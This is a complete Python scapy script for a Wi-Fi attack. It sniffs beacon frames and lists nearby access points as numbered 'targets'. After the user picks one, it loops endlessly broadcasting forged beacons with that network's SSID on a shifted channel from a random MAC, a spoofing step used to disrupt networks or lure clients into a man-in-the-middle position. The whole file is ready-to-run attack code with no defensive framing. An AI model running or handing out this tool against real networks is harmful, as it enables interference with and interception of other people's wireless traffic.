#!/usr/bin/env python
from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11Elt, Dot11, RadioTap
from scapy.sendrecv import sniff

iface = "wlp0s20u2"

ap_list = []
ap_ssidToChannel = {}

def inputNumber(message, imin, imax):
    while True:
        try:
            userInput = int(input(message))
        except ValueError:
            print("Not an integer! Try again.")
            continue
        else:
            if imin > userInput or userInput > imax:
                continue
            return userInput
            break

def PacketHandler(packet):
    if packet.haslayer(Dot11Beacon) and packet[Dot11].addr3 not in ap_list:
        try:
            intensity = packet.dBm_AntSignal
            ssid = packet[Dot11Elt].info
            bssid = packet[Dot11].addr3
            channel = int(ord(packet[Dot11Elt:3].info))
            ap_list.append(ssid)
            ap_ssidToChannel[ssid] = int(channel)
            print("=== Target #%d ===\nssid: %s\nbssid: %s\nchannel: %s\nintensity: %d dBm" % (
                len(ap_list), ssid.decode("utf-8"), str(bssid), str(channel), intensity))
        except Exception as e:
            # print(e)
            return

# Sniff phase
print("Press CTRL+C whenever you're happy with the SSIDs list.")
sniff(iface=iface, prn=PacketHandler)

# Target selection phase
choice = inputNumber("Please select the target (1-%d): " % (len(ap_list)), 1, len(ap_list))

# ATTACK
ssid = ap_list[choice - 1]
realChannel = ap_ssidToChannel[ssid]

fakeChannel = realChannel - 6 if realChannel > 6 else realChannel + 6

print("Sending a fake beacons with SSID %s, channel %d (real channel is %d) (10/second)" % (ssid, fakeChannel, realChannel))

sender_mac = RandMAC()
dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)
beacon = Dot11Beacon(cap="ESS+privacy")
essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
echann = Dot11Elt(ID="DSset", info=chr(fakeChannel))
frame = RadioTap()/dot11/beacon/essid/echann

sendp(frame, inter=0.1, iface=iface, loop=1)

